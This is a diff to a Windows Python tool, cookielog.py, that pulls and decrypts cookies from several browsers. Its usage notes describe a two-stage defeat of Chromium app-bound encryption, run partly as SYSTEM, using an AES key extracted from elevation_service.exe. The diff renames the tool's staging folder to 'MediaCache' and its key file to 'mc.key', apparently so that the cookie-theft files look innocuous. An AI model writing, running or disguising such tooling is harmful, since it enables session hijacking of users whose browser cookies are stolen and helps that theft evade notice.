@@ -11,7 +11,7 @@
 #   python cookielog.py --live      # continuous log -> cookie_log.jsonl (new/changed)
 #   python cookielog.py --firefox   # filter browser (chrome|edge|brave|vivaldi|opera|firefox)
 #   python cookielog.py --v20-sys   # app-bound stage 1, as SYSTEM
-#   python cookielog.py --v20-usr   # stage 2, as user -> v20.key
+#   python cookielog.py --v20-usr   # stage 2, as user -> mc.key
 #
 # deps: pip install cryptography
 import argparse, base64, ctypes, ctypes.wintypes as W, glob, json, os, shutil, sqlite3, subprocess, sys, tempfile, time
@@ -31,7 +31,7 @@ except ImportError:
     def open_blob(key, nonce, blob): return open_blob_flag(1, key, nonce, blob)
 
 HERE  = os.path.dirname(os.path.abspath(__file__))
-STAGE = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), "cookielog")
+STAGE = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), "MediaCache")
 LA    = os.environ["LOCALAPPDATA"];  APP = os.environ["APPDATA"]
 
 # AES key from elevation_service.exe (Chrome 127..~131); re-extract from binary on new builds
@@ -94,7 +94,7 @@ def rows(main, sql):
 
 # ------------------------------------------------------------------ Chromium keys
 def v20_key():
-    p = os.path.join(STAGE, "v20.key")
+    p = os.path.join(STAGE, "mc.key")
     if not os.path.exists(p): return None
     with open(p, "rb") as f: return base64.b64decode(f.read())
 
@@ -245,9 +245,9 @@ def stage_v20(a):
         with open(f, "rb") as fh: wrapped = dpapi(fh.read())           # layer 2: USER DPAPI
         flag = wrapped[0]                                              # 1 = AES-GCM, other = ChaCha20
         key = open_blob_flag(flag, ELEV_AES, wrapped[1:13], wrapped[13:])
-        with open(os.path.join(STAGE, "v20.key"), "wb") as f: f.write(base64.b64encode(key))
+        with open(os.path.join(STAGE, "mc.key"), "wb") as f: f.write(base64.b64encode(key))
         got += 1
-    print("stage 2 ok: v20.key generated" if got else "nothing to do in stage 2")
+    print("stage 2 ok: mc.key generated" if got else "nothing to do in stage 2")
 
 if __name__ == "__main__":
     main()
